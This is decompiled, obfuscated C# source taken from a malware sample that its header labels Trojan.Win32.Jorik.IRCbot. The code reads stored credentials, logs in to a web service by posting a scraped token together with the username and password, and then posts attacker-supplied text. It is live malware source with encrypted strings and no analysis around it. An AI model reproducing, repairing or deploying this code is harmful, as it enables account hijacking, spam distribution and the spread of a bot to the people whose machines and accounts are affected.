// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0002;
using \u0004;
using \u000F;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace \u0002
{
  internal sealed class \u0003
  {
    [NonSerialized]
    internal static \u0008.\u0004 \u0094;

    public static void \u0001([In] string[] obj0)
    {
      try
      {
        string str1 = \u000F.\u0004.\u0001(\u0003.\u0094(4584));
label_1:
        string[] strArray1 = \u0015.\u007E\u0016\u0002((object) str1, new char[1]
        {
          ':'
        });
        string str2 = strArray1[0];
        string str3 = strArray1[1];
        if (!\u0007.\u0087(str1, \u0003.\u0094(1670)))
          return;
        int num1 = 0;
        string str4;
        while (true)
        {
          bool flag = num1 != 0;
          str4 = \u0003.\u0094(1670);
          string[] strArray2 = obj0;
          int index;
          if (true)
          {
            index = 0;
            goto label_23;
          }
          else
            goto label_9;
label_8:
          int num2;
          if (num2 == 0)
            goto label_11;
label_9:
          int num3 = 1;
label_10:
          flag = num3 != 0;
label_11:
          string str5;
          if (true)
          {
            num2 = \u0005.\u007E\u0082((object) str5, \u0003.\u0094(4601)) ? 1 : 0;
            if (true)
            {
              if (num2 != 0)
              {
                flag = false;
                str4 = \u0010.\u008D(str4, str5);
              }
              if (true)
              {
                if (flag)
                  str4 = \u0011.\u008E(str4, str5, \u0003.\u0094(659));
                int num4 = index;
                if (false)
                {
                  num1 = num4;
                  continue;
                }
                if (true)
                  ++num4;
                if (false)
                {
                  num3 = num4;
                  goto label_10;
                }
                else
                  index = num4;
              }
              else
                goto label_1;
            }
            else
              goto label_8;
          }
          else
            goto label_1;
label_23:
          if (index < strArray2.Length)
          {
            str5 = strArray2[index];
            num2 = \u0005.\u007E\u0084((object) str5, \u0003.\u0094(4601)) ? 1 : 0;
            goto label_8;
          }
          else
            break;
        }
        string str6 = \u0007\u0002.\u007E\u008E\u0003((object) str4, \u0003.\u0094(4601), \u0003.\u0094(1670));
        string str7 = \u0087\u0002.\u007E\u0015\u0004((object) str6, new char[1]
        {
          ' '
        });
        if (!\u0007.\u0087(str6, \u0003.\u0094(1670)) || !\u0003.\u0001(str2, str3, str6))
          return;
        string[] strArray3 = new string[5]
        {
          \u0003.\u0094(4606),
          \u000E.\u0002.\u0001(\u0010.\u008D(\u0003.\u0094(659), str2)),
          \u0003.\u0094(664),
          \u000E.\u0002.\u0001(\u0010.\u008D(\u0003.\u0094(659), str6)),
          \u0003.\u0094(573)
        };
        \u000E.\u0002.\u0001(\u0018.\u001A\u0002(strArray3), \u0001.\u0010);
      }
      catch
      {
      }
    }

    public static bool \u0001([In] string obj0, [In] string obj1, [In] string obj2)
    {
      CookieContainer cookieContainer = new CookieContainer();
      string str1 = \u0003.\u0001(\u0003.\u0094(4639), ref cookieContainer);
      string str2 = \u0003.\u0094(1670);
      int num = \u009E\u0002.\u007E\u008C\u0004((object) str1, \u0003.\u0094(4692));
      if (true)
      {
        if (num > -1)
        {
          Regex regex = new Regex(\u0003.\u0094(4737));
          Match match = \u009F\u0002.\u007E\u008E\u0004((object) regex, str1);
          if (\u008C.\u007E\u0011\u0003((object) match))
            str2 = \u0003.\u007E\u0014((object) \u0002\u0003.\u007E\u0090\u0004((object) \u0001\u0003.\u007E\u008F\u0004((object) match), 1));
        }
        string str3 = \u0003.\u0094(4782);
        string[] strArray = new string[6]
        {
          \u0003.\u0094(4831),
          str2,
          \u0003.\u0094(4860),
          obj0,
          \u0003.\u0094(4877),
          obj1
        };
        string str4 = \u0018.\u001A\u0002(strArray);
        ref CookieContainer local = ref cookieContainer;
        string str5 = \u0003.\u0094(4639);
        \u0003.\u0001(str3, str4, ref local, str5);
        string str6 = \u0003.\u0001(\u0003.\u0094(4894), ref cookieContainer);
        num = \u0005.\u007E\u0081((object) str6, \u0003.\u0094(4931)) ? 1 : 0;
      }
      if (num == 0)
        return false;
      string str7 = \u0003.\u0094(4894);
      string[] strArray1 = new string[5]
      {
        \u0003.\u0094(4831),
        str2,
        \u0003.\u0094(4944),
        global::\u0004.\u001F(obj2),
        \u0003.\u0094(4969)
      };
      string str8 = \u0018.\u001A\u0002(strArray1);
      ref CookieContainer local1 = ref cookieContainer;
      string str9 = \u0003.\u0094(5131);
      \u0003.\u0001(str7, str8, ref local1, str9);
      return true;
    }

    private static string \u0001([In] string obj0, [In] string obj1, [In] ref CookieContainer obj2, [In] string obj3)
    {
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) \u0003\u0003.\u0091\u0004(obj0);
        \u0084.\u007E\u009A\u0002((object) httpWebRequest, true);
        \u0004\u0003.\u007E\u0092\u0004((object) httpWebRequest, HttpVersion.Version11);
        \u0012.\u007E\u0095((object) httpWebRequest, \u0003.\u0094(1390));
        \u0012.\u007E\u0096((object) httpWebRequest, \u0003.\u0094(5168));
        \u0012.\u007E\u0097((object) httpWebRequest, obj3);
        if (obj2 != null)
          \u0005\u0003.\u007E\u0093\u0004((object) httpWebRequest, obj2);
        byte[] numArray = \u0081.\u007E\u008F\u0002((object) \u0080.\u008C\u0002(), obj1);
        \u0012.\u007E\u0098((object) httpWebRequest, \u0003.\u0094(5269));
        \u0006\u0003.\u007E\u0094\u0004((object) httpWebRequest, (long) numArray.Length);
        Stream stream = \u0007\u0003.\u007E\u0095\u0004((object) httpWebRequest);
        \u008D\u0002.\u007E\u001B\u0004((object) stream, numArray, 0, numArray.Length);
        \u0013.\u007E\u0004\u0002((object) stream);
        HttpWebResponse httpWebResponse = (HttpWebResponse) \u0008\u0003.\u007E\u0097\u0004((object) httpWebRequest);
        return \u0003.\u007E\u0015((object) new StreamReader(\u0007\u0003.\u007E\u0096\u0004((object) httpWebResponse)));
      }
      catch (Exception ex)
      {
        return \u0003.\u007E\u0011((object) ex);
      }
    }

    private static string \u0001([In] string obj0, [In] ref CookieContainer obj1)
    {
      string str = string.Empty;
      try
      {
        HttpWebRequest httpWebRequest;
        do
        {
          httpWebRequest = (HttpWebRequest) \u0003\u0003.\u0091\u0004(obj0);
        }
        while (false);
        \u0012.\u007E\u0095((object) httpWebRequest, \u0003.\u0094(1385));
        \u0084.\u007E\u009A\u0002((object) httpWebRequest, true);
        \u0012.\u007E\u0096((object) httpWebRequest, \u0003.\u0094(1284));
        \u0084.\u007E\u009B\u0002((object) \u000E\u0003.\u007E\u0098\u0004((object) httpWebRequest), false);
        if (obj1 != null)
          \u0005\u0003.\u007E\u0093\u0004((object) httpWebRequest, obj1);
        HttpWebResponse httpWebResponse = \u0008\u0003.\u007E\u0097\u0004((object) httpWebRequest) as HttpWebResponse;
        try
        {
          if (obj1 != null)
            \u0010\u0003.\u007E\u009A\u0004((object) obj1, \u000F\u0003.\u007E\u0099\u0004((object) httpWebResponse));
          if (true)
          {
            Stream stream = \u0007\u0003.\u007E\u0096\u0004((object) httpWebResponse);
            try
            {
              StreamReader streamReader = new StreamReader(stream);
              try
              {
                str = \u0003.\u007E\u0015((object) streamReader);
              }
              finally
              {
                if (streamReader != null)
                  \u0013.\u007E\u009D((object) streamReader);
              }
            }
            finally
            {
              if (stream != null)
                \u0013.\u007E\u009D((object) stream);
            }
          }
        }
        finally
        {
          if (httpWebResponse != null)
            \u0013.\u007E\u009D((object) httpWebResponse);
        }
        return str;
      }
      catch
      {
        return str;
      }
    }

    static \u0003() => \u0005.\u0001(typeof (\u0003));
  }
}
